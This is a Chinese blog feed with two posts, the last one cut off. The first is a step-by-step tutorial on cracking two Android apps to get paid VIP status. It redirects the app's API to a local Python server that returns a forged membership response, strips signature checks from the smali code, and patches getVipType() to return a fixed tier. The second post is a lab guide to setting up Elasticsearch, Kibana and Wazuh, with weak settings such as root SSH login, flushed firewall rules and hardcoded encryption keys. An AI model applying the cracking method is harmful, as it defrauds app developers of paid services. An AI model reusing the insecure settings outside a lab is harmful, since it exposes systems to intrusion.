        <content type="html"><![CDATA[<p>目标是得到软件VIP权限，两款软件均需要联网登陆，由于使用的环境权限较低，无法安装证书代理https，因此需要修改APK安装包。</p><h2 id="环境准备："><a href="#环境准备：" class="headerlink" title="环境准备："></a>环境准备：</h2><ol><li>雷电模拟器</li><li>MT管理器</li><li>Jadx</li><li>JEB</li><li>LSPosed框架</li></ol><p>学习资源：<a href="https://www.52pojie.cn/thread-1695141-1-1.html">https://www.52pojie.cn/thread-1695141-1-1.html</a></p><h2 id="APP1："><a href="#APP1：" class="headerlink" title="APP1："></a>APP1：</h2><p>使用 MT管理器对app重新签名安装运行发现没有任何异常， 判断该APP没有证书校验，因此修改比较简单。</p><p>通过在模拟器中抓包，可以找到到对应的域名，使用 Jadx 分析对应代码，可以看到是获取用户信息后，api接口返回对应的资源，本地再授予权限，并且接口未使用https。</p><p><img src="/assets/image-20250720085707729.png" alt="image-20250720085707729"></p><p>因此使用MT管理器修改domain name，并使用 python监听返回固定的响应即可。</p><p><img src="/assets/image-20250720090711290.png" alt="image-20250720090711290"></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> sanic <span class="token keyword">import</span> Sanic<span class="token keyword">from</span> sanic<span class="token punctuation">.</span>response <span class="token keyword">import</span> jsonapp <span class="token operator">=</span> Sanic<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/api/addUserInfo'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># 替换为你想要监听的URL</span><span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">your_route2</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>  data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"id"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">"lock"</span><span class="token punctuation">:</span><span class="token string">"0"</span><span class="token punctuation">,</span><span class="token string">"list"</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token string">"type"</span><span class="token punctuation">:</span><span class="token string">"DT02"</span><span class="token punctuation">,</span><span class="token string">"state"</span><span class="token punctuation">:</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"date"</span><span class="token punctuation">:</span><span class="token string">"2050-02-03"</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">{</span><span class="token string">"type"</span><span class="token punctuation">:</span><span class="token string">"DT01"</span><span class="token punctuation">,</span><span class="token string">"state"</span><span class="token punctuation">:</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"date"</span><span class="token punctuation">:</span><span class="token string">"2050-02-03"</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">}</span>  <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>  <span class="token keyword">return</span> json<span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>  app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">)</span>`</code></pre><h2 id="APP2："><a href="#APP2：" class="headerlink" title="APP2："></a>APP2：</h2><p>同样先使用MT重新签名，签名后重新安装，发现打开即闪退。 可能存在签名校验，使用 MT自带各种方法去除签名验证均失败。</p><h3 id="去除签名校验："><a href="#去除签名校验：" class="headerlink" title="去除签名校验："></a>去除签名校验：</h3><p>Jadx中搜索signatures 关键词，发现存在多处获取签名行为，并存在 kill自身进程的行为。</p><p><img src="/assets/image-20250720091822151.png" alt="image-20250720091822151"></p><p>转换为 smali 代码后，可以看到有 以下两种 退出程序的方法</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Ljava</span><span class="token operator">/</span>lang<span class="token operator">/</span><span class="token class-name">System</span><span class="token punctuation">;</span><span class="token operator">-&gt;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token class-name">I</span><span class="token punctuation">)</span><span class="token class-name">V</span><span class="token class-name">Landroid</span><span class="token operator">/</span>os<span class="token operator">/</span><span class="token class-name">Process</span><span class="token punctuation">;</span><span class="token operator">-&gt;</span><span class="token function">killProcess</span><span class="token punctuation">(</span><span class="token class-name">I</span><span class="token punctuation">)</span><span class="token class-name">V</span></code></pre><p><img src="/assets/image-20250720092028135.png" alt="image-20250720092028135"></p><p>在MT管理器中找到所有与该签名有关的 killprocess和exit，并将其直接注释。 重新打包后安装发现不会闪退了。</p><p><img src="/assets/image-20250720092239583.png" alt="image-20250720092239583"></p><h3 id="获取VIP："><a href="#获取VIP：" class="headerlink" title="获取VIP："></a>获取VIP：</h3><p>继续分析，可通过抓取域名或搜索http相关关键词，可以找到服务端域名。</p><p>搜索VIP关键词，可以看到VIP类型是存放在vipType 成员中的，因此在MT管理器中直接修改<code>getVipType()</code>函数</p><p>并使用 1/2/3 代表不同的会员类型</p><p><strong>修改前：</strong></p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">Integer</span> <span class="token function">getVipType</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>vipType<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>对应smali代码：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token punctuation">.</span>method <span class="token keyword">public</span> <span class="token function">getVipType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token class-name">Ljava</span><span class="token operator">/</span>lang<span class="token operator">/</span><span class="token class-name">Integer</span><span class="token punctuation">;</span>    <span class="token punctuation">.</span>registers <span class="token number">2</span>    <span class="token punctuation">.</span>line <span class="token number">1</span>    iget<span class="token operator">-</span>object v0<span class="token punctuation">,</span> p0<span class="token punctuation">,</span> <span class="token class-name">Lcom</span><span class="token operator">/</span>xxx<span class="token operator">/</span>xxx<span class="token operator">/</span>repertory<span class="token operator">/</span>server<span class="token operator">/</span>model<span class="token operator">/</span><span class="token class-name">CLoginResponse</span><span class="token punctuation">;</span><span class="token operator">-&gt;</span>vipType<span class="token operator">:</span><span class="token class-name">Ljava</span><span class="token operator">/</span>lang<span class="token operator">/</span><span class="token class-name">Integer</span><span class="token punctuation">;</span>    <span class="token keyword">return</span><span class="token operator">-</span>object v0<span class="token punctuation">.</span>end method</code></pre><p><strong>修改后：</strong></p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">Integer</span> <span class="token function">getVipType</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Integer</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>对应smali代码：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token punctuation">.</span>method <span class="token keyword">public</span> <span class="token function">getVipType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token class-name">Ljava</span><span class="token operator">/</span>lang<span class="token operator">/</span><span class="token class-name">Integer</span><span class="token punctuation">;</span>    <span class="token punctuation">.</span>registers <span class="token number">3</span>    <span class="token punctuation">.</span>line <span class="token number">1</span>    <span class="token keyword">new</span><span class="token operator">-</span>instance v0<span class="token punctuation">,</span> <span class="token class-name">Ljava</span><span class="token operator">/</span>lang<span class="token operator">/</span><span class="token class-name">Integer</span><span class="token punctuation">;</span>    <span class="token keyword">const</span><span class="token operator">/</span><span class="token number">4</span> v1<span class="token punctuation">,</span> <span class="token number">0x2</span>    invoke<span class="token operator">-</span>direct <span class="token punctuation">{</span>v0<span class="token punctuation">,</span> v1<span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token class-name">Ljava</span><span class="token operator">/</span>lang<span class="token operator">/</span><span class="token class-name">Integer</span><span class="token punctuation">;</span><span class="token operator">-&gt;</span><span class="token generics"><span class="token punctuation">&lt;</span>init<span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token class-name">I</span><span class="token punctuation">)</span><span class="token class-name">V</span>    <span class="token keyword">return</span><span class="token operator">-</span>object v0<span class="token punctuation">.</span>end method</code></pre><p>重新打包， 安装登陆， 登陆成功后即为VIP。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
            <tag> 安卓 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SOC_ES7.17.13</title>
      <link href="/2023/10/11/soc-es7/"/>
      <url>/2023/10/11/soc-es7/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-序言"><a href="#0x00-序言" class="headerlink" title="0x00 序言"></a>0x00 序言</h1><p>搭建SOC完整架构尝试</p><p>架构图如下</p><p><img src="/assets/image-20231011175154949.png" alt="image-20231011175154949"></p><h1 id="0x01-环境准备"><a href="#0x01-环境准备" class="headerlink" title="0x01 环境准备"></a>0x01 环境准备</h1><p>概述 整个文档可以查看wazuh all in one 安装文档</p><p><a href="https://documentation.wazuh.com/current/deployment-options/elastic-stack/all-in-one-deployment/index.html">https://documentation.wazuh.com/current/deployment-options/elastic-stack/all-in-one-deployment/index.html</a></p><p>卸载文档：</p><p><a href="https://documentation.wazuh.com/current/user-manual/uninstall/elastic-stack.html">https://documentation.wazuh.com/current/user-manual/uninstall/elastic-stack.html</a></p><pre class="language-none"><code class="language-none">VM1:Ubuntu 22.04.3 LTS</code></pre><h1 id="0x02-Ubuntu-VM安装"><a href="#0x02-Ubuntu-VM安装" class="headerlink" title="0x02 Ubuntu VM安装"></a>0x02 Ubuntu VM安装</h1><p>此处不做过多详细介绍，网上教程很多</p><p>下载 ISO <a href="https://releases.ubuntu.com/22.04/ubuntu-22.04.3-live-server-amd64.iso.torrent">https://releases.ubuntu.com/22.04/ubuntu-22.04.3-live-server-amd64.iso.torrent</a></p><p>下载后在 VMware 中安装，配置如图</p><img src="/assets/image-20231011164338357.png" alt="image-20231011164338357" style="zoom: 80%;"><p>安装过程中，记得安装 openssh 服务，完成安装后，修改 Root 可SSH 登陆。</p><pre class="language-bash" data-language="bash"><code class="language-bash">root@soc:~<span class="token comment"># cat /etc/ssh/sshd_config | grep -i root</span>PermitRootLogin <span class="token function">yes</span><span class="token comment">#修改时区</span>timedatectl set-timezone Asia/Shanghaisystemctl restart systemd-timesyncd<span class="token comment">#清除所有防火墙规则</span>ufw disableiptables -Fiptables -X</code></pre><h1 id="0x03-ES-Kibana-安装"><a href="#0x03-ES-Kibana-安装" class="headerlink" title="0x03 ES+Kibana 安装"></a>0x03 ES+Kibana 安装</h1><p>经过查询官方文档 <a href="https://documentation.wazuh.com/current/integrations-guide/index.html">https://documentation.wazuh.com/current/integrations-guide/index.html</a> 和<a href="https://documentation.wazuh.com/4.5/deployment-options/elastic-stack/index.html">https://documentation.wazuh.com/4.5/deployment-options/elastic-stack/index.html</a> 得知， filebeat集成的方式仅支持 到Wazuh 4.5.3 and Elastic Stack 7.17.13</p><p>高于次版本需使用 Logstash 进行集成</p><p>因此，此处安装 ES Kibana 均为 7.17.13</p><h3 id="1-ElasticSearch-安装"><a href="#1-ElasticSearch-安装" class="headerlink" title="1. ElasticSearch 安装"></a>1. ElasticSearch 安装</h3><p>直接访问 <a href="https://www.elastic.co/guide/en/elasticsearch/reference/7.17/deb.html#deb-repo">https://www.elastic.co/guide/en/elasticsearch/reference/7.17/deb.html#deb-repo</a></p><p>根据文档执行下列命令</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> -qO - https://artifacts.elastic.co/GPG-KEY-elasticsearch <span class="token operator">|</span> <span class="token function">sudo</span> gpg --dearmor -o /usr/share/keyrings/elasticsearch-keyring.gpg<span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> apt-transport-https<span class="token builtin class-name">echo</span> <span class="token string">"deb [signed-by=/usr/share/keyrings/elasticsearch-keyring.gpg] https://artifacts.elastic.co/packages/7.x/apt stable main"</span> <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">tee</span> /etc/apt/sources.list.d/elastic-7.x.list<span class="token function">sudo</span> <span class="token function">apt-get</span> update <span class="token operator">&amp;&amp;</span> <span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> <span class="token assign-left variable">elasticsearch</span><span class="token operator">=</span><span class="token number">7.17</span>.13</code></pre><p>配置yml文件</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> /etc/elasticsearch/elasticsearch.ymlcluster.name: my-applicationnode.name: node-1path.data: /var/lib/elasticsearchpath.logs: /var/log/elasticsearchnetwork.host: <span class="token number">0.0</span>.0.0http.port: <span class="token number">9200</span>cluster.initial_master_nodes: <span class="token punctuation">[</span><span class="token string">"node-1"</span><span class="token punctuation">]</span></code></pre><p>操作 elasticsearch</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#设置开机自启</span>systemctl <span class="token builtin class-name">enable</span> elasticsearch.service<span class="token comment">#启动 es</span>systemctl start elasticsearch.service<span class="token comment">#停止es</span>systemctl stop elasticsearch.service<span class="token comment">#查看es状态</span>systemctl status elasticsearch.service</code></pre><p>访问测试：</p><p><img src="/assets/image-20231011204105441.png" alt="image-20231011204105441"></p><p>额外配置</p><pre class="language-none"><code class="language-none">vim /etc/security/limits.conf   # 在最后面追加下面内容esuser hard nofile 65536esuser soft nofile 65536vim /etc/sysctl.conf    # 在最后面追加下面内容vm.max_map_count=655360sysctl -p</code></pre><h4 id="2-Kibana安装"><a href="#2-Kibana安装" class="headerlink" title="2.Kibana安装"></a>2.Kibana安装</h4><p>直接访问 <a href="https://www.elastic.co/guide/en/kibana/7.17/deb.html#deb-repo">https://www.elastic.co/guide/en/kibana/7.17/deb.html#deb-repo</a></p><p>根据文档执行下列命令**(安装ES的时候已经执行过，这无需执行这几行，直接执行最后一行安装即可)**</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> update <span class="token operator">&amp;&amp;</span> <span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> <span class="token assign-left variable">kibana</span><span class="token operator">=</span><span class="token number">7.17</span>.13</code></pre><p>配置yml文件</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#cat /etc/kibana/kibana.yml</span>server.port: <span class="token number">5601</span>server.host: <span class="token string">"0.0.0.0"</span>server.name: <span class="token string">"kibana"</span>elasticsearch.hosts: <span class="token punctuation">[</span><span class="token string">"http://localhost:9200"</span><span class="token punctuation">]</span>kibana.index: <span class="token string">".kibana"</span>kibana.defaultAppId: <span class="token string">"home"</span>pid.file: /run/kibana/kibana.pidlogging:  appenders:    file:      type: <span class="token function">file</span>      fileName: /var/log/kibana/kibana.log      layout:        type: json  root:    appenders:      - default      - <span class="token function">file</span>xpack.encryptedSavedObjects.encryptionKey: iGhu317CGomTQ3UH1nQwYF7yZ8asWPKHHYMwjBUJxpack.security.encryptionKey: iGhu317CGomTQ3UH1nQwYF7yZ8asWPKHHYMwjBUJxpack.reporting.encryptionKey: iGhu317CGomTQ3UH1nQwYF7yZ8asWPKHHYMwjBUJ</code></pre><p>操作 kibana</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#设置开机自启</span>systemctl <span class="token builtin class-name">enable</span> kibana.service<span class="token comment">#启动 es</span>systemctl start kibana.service<span class="token comment">#停止es</span>systemctl stop kibana.service<span class="token comment">#查看es状态</span>systemctl status kibana.service</code></pre><p>访问测试：</p><img src="/assets/image-20231011204040638.png" alt="image-20231011204040638" style="zoom:80%;"><p>至此，已经完成ES和Kibana的安装,我们的数据存储和浏览的核心组件。</p><h1 id="0x04-wazuh-server安装"><a href="#0x04-wazuh-server安装" class="headerlink" title="0x04 wazuh-server安装"></a>0x04 wazuh-server安装</h1><p>Wazuh 架构图：</p><p>本文主要使用 wazuh 做日志收集、规则判断</p><p><img src="/assets/image-20231011182108967.png" alt="image-20231011182108967"></p><p>访问 <a href="https://documentation.wazuh.com/current/installation-guide/wazuh-server/step-by-step.html">https://documentation.wazuh.com/current/installation-guide/wazuh-server/step-by-step.html</a></p><p>根据文档执行安装命令如下：</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">apt-get</span> <span class="token function">install</span> gnupg apt-transport-https<span class="token function">curl</span> -s https://packages.wazuh.com/key/GPG-KEY-WAZUH <span class="token operator">|</span> gpg --no-default-keyring --keyring gnupg-ring:/usr/share/keyrings/wazuh.gpg --import <span class="token operator">&amp;&amp;</span> <span class="token function">chmod</span> <span class="token number">644</span> /usr/share/keyrings/wazuh.gpg<span class="token builtin class-name">echo</span> <span class="token string">"deb [signed-by=/usr/share/keyrings/wazuh.gpg] https://packages.wazuh.com/4.x/apt/ stable main"</span> <span class="token operator">|</span> <span class="token function">tee</span> -a /etc/apt/sources.list.d/wazuh.list<span class="token function">apt-get</span> update <span class="token operator">&amp;&amp;</span> <span class="token function">apt-get</span> -y <span class="token function">install</span> wazuh-manager<span class="token operator">=</span><span class="token number">4.5</span>.3<span class="token comment">#打开archives.json</span><span class="token function">vim</span> /var/ossec/etc/ossec.conf<span class="token operator">&lt;</span>logall_json<span class="token operator">&gt;</span>yes<span class="token operator">&lt;</span>/logall_json<span class="token operator">&gt;</span><span class="token comment">#设置开机自启动并启动wazuh manager</span>systemctl daemon-reloadsystemctl <span class="token builtin class-name">enable</span> wazuh-managersystemctl start wazuh-manager<span class="token comment">#查看wazuh 状态</span>systemctl status wazuh-manager</code></pre><p>Wazuh 启动后，需要将Wazuh的日志，发送到ES，此处使用 FileBeat 进行转发</p><p>要确保Wazuh将警报记录到/var/ossec/logs/alers/alerts.json，请检查Wazuh服务器配置/var/ossec/etc/ossec.conf文件中的 jsonout_output 选项是否设置为yes。</p><h3 id="FileBeat-安装与配置"><a href="#FileBeat-安装与配置" class="headerlink" title="FileBeat 安装与配置"></a>FileBeat 安装与配置</h3><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">apt-get</span> -y <span class="token function">install</span> <span class="token assign-left variable">filebeat</span><span class="token operator">=</span><span class="token number">7.17</span>.13<span class="token comment">#下载wazuh编辑好的filebeat yml文件</span><span class="token function">curl</span> -so /etc/filebeat/filebeat.yml https://packages.wazuh.com/4.5/tpl/wazuh/filebeat/filebeat.yml<span class="token comment">#编辑配置文件</span><span class="token function">vim</span> /etc/filebeat/filebeat.yml</code></pre><p>修改后文件内容如下</p><pre class="language-none"><code class="language-none"># Wazuh - Filebeat configuration fileoutput.elasticsearch:  hosts: ["127.0.0.1:9200"]  protocol: http#  username: ${username}#  password: ${password}#  ssl.certificate_authorities:#    - /etc/filebeat/certs/root-ca.pem#  ssl.certificate: "/etc/filebeat/certs/filebeat.pem"#  ssl.key: "/etc/filebeat/certs/filebeat-key.pem"setup.template.json.enabled: truesetup.template.json.path: '/etc/filebeat/wazuh-template.json'setup.template.json.name: 'wazuh'setup.ilm.overwrite: truesetup.ilm.enabled: falsefilebeat.modules:  - module: wazuh    alerts:      enabled: true    archives:      enabled: truelogging.level: infologging.to_files: truelogging.files:  path: /var/log/filebeat  name: filebeat  keepfiles: 7  permissions: 0644logging.metrics.enabled: falseseccomp:  default_action: allow  syscalls:  - action: allow    names:    - rseq</code></pre><p>下载 wazuh alerts索引template</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> -so /etc/filebeat/wazuh-template.json https://raw.githubusercontent.com/wazuh/wazuh/4.5/extensions/elasticsearch/7.x/wazuh-template.json<span class="token function">chmod</span> go+r /etc/filebeat/wazuh-template.json<span class="token comment">#下载 wazuh module</span><span class="token function">curl</span> -s https://packages.wazuh.com/4.x/filebeat/wazuh-filebeat-0.2.tar.gz <span class="token operator">|</span> <span class="token function">tar</span> -xvz -C /usr/share/filebeat/module<span class="token comment">#启动 filebeat</span>systemctl daemon-reloadsystemctl <span class="token builtin class-name">enable</span> filebeatsystemctl start filebeat</code></pre><p>查看Kibana，可以看到 alerts 和的日志了</p><p><img src="/assets/image-20231011205448375.png" alt="image-20231011205448375"></p><h1 id="0x05-Kibana-Wazuh-Plugin安装"><a href="#0x05-Kibana-Wazuh-Plugin安装" class="headerlink" title="0x05 Kibana-Wazuh-Plugin安装"></a>0x05 Kibana-Wazuh-Plugin安装</h1><p>访问 <a href="https://documentation.wazuh.com/4.5/deployment-options/elastic-stack/index.html#packages-list-elk">https://documentation.wazuh.com/4.5/deployment-options/elastic-stack/index.html#packages-list-elk</a> 查找对应版本的离线安装包</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /tmp<span class="token function">wget</span> https://packages.wazuh.com/4.x/ui/kibana/wazuh_kibana-4.5.3_7.17.13-1.zip<span class="token builtin class-name">cd</span> /usr/share/kibana<span class="token function">sudo</span> /usr/share/kibana/bin/kibana-plugin <span class="token function">install</span> file:///tmp/wazuh_kibana-4.5.3_7.17.13-1.zip<span class="token function">chown</span> kibana:kibana -R /usr/share/kibana/systemctl restart kibana</code></pre><p>重启kibana后，可以查看到 wazuh 插件</p><img src="/assets/image-20231011210732211.png" alt="image-20231011210732211" style="zoom:80%;"><h3 id="Wazuh-agent安装"><a href="#Wazuh-agent安装" class="headerlink" title="Wazuh-agent安装"></a>Wazuh-agent安装</h3><p>测试在 Kali 安装 wazuh-agent</p><p>可参考文档 <a href="https://documentation.wazuh.com/current/installation-guide/wazuh-agent/index.html">https://documentation.wazuh.com/current/installation-guide/wazuh-agent/index.html</a></p><pre class="language-none"><code class="language-none">curl -so wazuh-agent.deb https://packages.wazuh.com/4.x/apt/pool/main/w/wazuh-agent/wazuh-agent_4.5.3-1_amd64.deb &amp;&amp; sudo WAZUH_MANAGER='192.168.137.134' dpkg -i ./wazuh-agent.debsudo systemctl daemon-reloadsudo systemctl enable wazuh-agentsudo systemctl start wazuh-agent</code></pre><p>再次查看 kibana，可以看到 agent 已经上线</p><p><img src="/assets/image-20231011211432342.png" alt="image-20231011211432342"></p><h1 id="0x06-Wazuh-decoders-amp-rules"><a href="#0x06-Wazuh-decoders-amp-rules" class="headerlink" title="0x06 Wazuh-decoders&amp;rules"></a>0x06 Wazuh-decoders&amp;rules</h1><p>语法文档：<a href="https://documentation.wazuh.com/current/user-manual/ruleset/ruleset-xml-syntax/index.html">https://documentation.wazuh.com/current/user-manual/ruleset/ruleset-xml-syntax/index.html</a></p><h3 id="1-自定义decoder-amp-rule"><a href="#1-自定义decoder-amp-rule" class="headerlink" title="1.自定义decoder &amp; rule"></a>1.自定义decoder &amp; rule</h3><p>参考文档 <a href="https://documentation.wazuh.com/current/user-manual/ruleset/custom.html">https://documentation.wazuh.com/current/user-manual/ruleset/custom.html</a></p><blockquote><p>自定义的rule id应当使用  100000 到120000 </p><p>示例日志</p></blockquote><pre class="language-none"><code class="language-none">Dec 25 20:45:02 MyHost example[12345]: User 'admin' logged from '192.168.1.100'</code></pre><p>在 <code>/var/ossec/etc/decoders/local_decoder.xml</code> 中插入如下新的 decoder</p><pre class="language-none"><code class="language-none">&lt;decoder name="example"&gt;  &lt;program_name&gt;^example&lt;/program_name&gt;&lt;/decoder&gt;&lt;decoder name="example"&gt;  &lt;parent&gt;example&lt;/parent&gt;  &lt;regex&gt;User '(\w+)' logged from '(\d+.\d+.\d+.\d+)'&lt;/regex&gt;  &lt;order&gt;user, srcip&lt;/order&gt;&lt;/decoder&gt;</code></pre><p>在 <code>/var/ossec/etc/rules/local_rules.xml</code> 中插入如下新的 rule</p><pre class="language-none"><code class="language-none">&lt;group name="custom_rules_example,"&gt;  &lt;rule id="100010" level="0"&gt;    &lt;program_name&gt;example&lt;/program_name&gt;    &lt;description&gt;User logged&lt;/description&gt;  &lt;/rule&gt;&lt;/group&gt;</code></pre><p>执行 <code>/var/ossec/bin/wazuh-logtest</code></p><pre class="language-none"><code class="language-none">#输入Dec 25 20:45:02 MyHost example[12345]: User 'admin' logged from '192.168.1.100'**Phase 1: Completed pre-decoding.        full event: 'Dec 25 20:45:02 MyHost example[12345]: User 'admin' logged from '192.168.1.100''        timestamp: 'Dec 25 20:45:02'        hostname: 'MyHost'        program_name: 'example'**Phase 2: Completed decoding.        name: 'example'        dstuser: 'admin'        srcip: '192.168.1.100'**Phase 3: Completed filtering (rules).        id: '100010'        level: '0'        description: 'User logged'        groups: '['custom_rules_example']'        firedtimes: '1'        mail: 'False'#重启 wazuh agent ，使该decoder和rules 生效systemctl restart wazuh-manager</code></pre><h3 id="2-修改已有rule"><a href="#2-修改已有rule" class="headerlink" title="2.修改已有rule"></a>2.修改已有rule</h3><p>修改时，建议将原有的规则直接拷贝出来到 自定义规则下<code>/var/ossec/etc/rules/</code> ，使用 <code>overwrite="yes"</code> tag将原因规则覆盖，防止升级导致规则丢失。</p><p>示例修改 ssh rule 5710：</p><ol><li><p>拷贝 <code>/var/ossec/ruleset/rules/0095-sshd_rules.xml</code> 中的 5710规则</p><pre class="language-none"><code class="language-none">&lt;group name="syslog,sshd,"&gt;  ...  &lt;rule id="5710" level="5"&gt;    &lt;if_sid&gt;5700&lt;/if_sid&gt;    &lt;match&gt;illegal user|invalid user&lt;/match&gt;    &lt;description&gt;sshd: Attempt to login using a non-existent user&lt;/description&gt;    &lt;mitre&gt;      &lt;id&gt;T1110&lt;/id&gt;    &lt;/mitre&gt;    &lt;group&gt;invalid_login,authentication_failed,pci_dss_10.2.4,pci_dss_10.2.5,pci_dss_10.6.1,gpg13_7.1,gdpr_IV_35.7.d,gdpr_IV_32.2,hipaa_164.312.b,nist_800_53_AU.14,nist_800_53_AC.7,nist_800_53_AU.6,tsc_CC6.1,tsc_CC6.8,tsc_CC7.2,tsc_CC7.3,&lt;/group&gt;  &lt;/rule&gt;  ...&lt;/group&gt;</code></pre></li><li><p>粘贴到自定义规则文件中 <code>/var/ossec/etc/rules/local_rules.xml</code> ,并设置 <code>overwrite="yes"</code></p></li></ol><pre class="language-none"><code class="language-none">&lt;group name="syslog,sshd,"&gt;  &lt;rule id="5710" level="10" overwrite="yes"&gt;    &lt;if_sid&gt;5700&lt;/if_sid&gt;    &lt;match&gt;illegal user|invalid user&lt;/match&gt;    &lt;description&gt;sshd: Attempt to login using a non-existent user&lt;/description&gt;    &lt;mitre&gt;      &lt;id&gt;T1110&lt;/id&gt;    &lt;/mitre&gt;    &lt;group&gt;invalid_login,authentication_failed,pci_dss_10.2.4,pci_dss_10.2.5,pci_dss_10.6.1,gpg13_7.1,gdpr_IV_35.7.d,gdpr_IV_32.2,hipaa_164.312.b,nist_800_53_AU.14,nist_800_53_AC.7,nist_800_53_AU.6,tsc_CC6.1,tsc_CC6.8,tsc_CC7.2,tsc_CC7.3,&lt;/group&gt;  &lt;/rule&gt;&lt;/group&gt;</code></pre><ol start="3"><li>重启wazuh <code>systemctl restart wazuh-manager</code></li></ol><h3 id="3-修改已有decoder"><a href="#3-修改已有decoder" class="headerlink" title="3.修改已有decoder"></a>3.修改已有decoder</h3><p>覆盖 decoder 需要整个文件进行覆盖，并修改 loading list</p><p>例如想要 修改 <code>0310-ssh_decoders.xml</code> ， 步骤如下</p><ol><li><p> <code>cp /var/ossec/ruleset/decoders/0310-ssh_decoders.xml /var/ossec/etc/decoders</code> </p></li><li><p>编辑 <code>/var/ossec/etc/ossec.conf</code>，设置  <code>&lt;decoder_exclude&gt;</code> 如下</p><pre class="language-none"><code class="language-none">&lt;ruleset&gt;  &lt;!-- Default ruleset --&gt;  &lt;decoder_dir&gt;ruleset/decoders&lt;/decoder_dir&gt;  &lt;rule_dir&gt;ruleset/rules&lt;/rule_dir&gt;  &lt;rule_exclude&gt;0215-policy_rules.xml&lt;/rule_exclude&gt;  &lt;list&gt;etc/lists/audit-keys&lt;/list&gt;  &lt;!-- User-defined ruleset --&gt;  &lt;decoder_dir&gt;etc/decoders&lt;/decoder_dir&gt;  &lt;rule_dir&gt;etc/rules&lt;/rule_dir&gt;  &lt;decoder_exclude&gt;ruleset/decoders/0310-ssh_decoders.xml&lt;/decoder_exclude&gt;&lt;/ruleset&gt;</code></pre></li><li><p>编辑 <code>/var/ossec/etc/decoders/0310-ssh_decoders.xml</code></p></li><li><p>重启wazuh server <code>systemctl restart wazuh-manager</code></p></li></ol><p>测试 </p><p><img src="/assets/image-20231012110801694.png" alt="image-20231012110801694"></p><h1 id="0x07-Wazuh-日志采集"><a href="#0x07-Wazuh-日志采集" class="headerlink" title="0x07 Wazuh-日志采集"></a>0x07 Wazuh-日志采集</h1><p>日志采集总结篇，可以查看 <a href="https://blog.161695.xyz/2025/07/26/wazuh-ri-zhi-cai-ji-zong-jie-pian/">https://blog.161695.xyz/2025/07/26/wazuh-ri-zhi-cai-ji-zong-jie-pian/</a></p><h3 id="1-Agent安装"><a href="#1-Agent安装" class="headerlink" title="1. Agent安装"></a>1. Agent安装</h3><p>比较简单，以Windows安装为例。 使用 Deploy new agent页面，生成对应的命令行。</p><pre class="language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">Invoke-WebRequest</span> <span class="token operator">-</span>Uri https:<span class="token operator">/</span><span class="token operator">/</span>packages<span class="token punctuation">.</span>wazuh<span class="token punctuation">.</span>com<span class="token operator">/</span>4<span class="token punctuation">.</span>x<span class="token operator">/</span>windows<span class="token operator">/</span>wazuh<span class="token operator">-</span>agent<span class="token operator">-</span>4<span class="token punctuation">.</span>5<span class="token punctuation">.</span>3<span class="token operator">-</span>1<span class="token 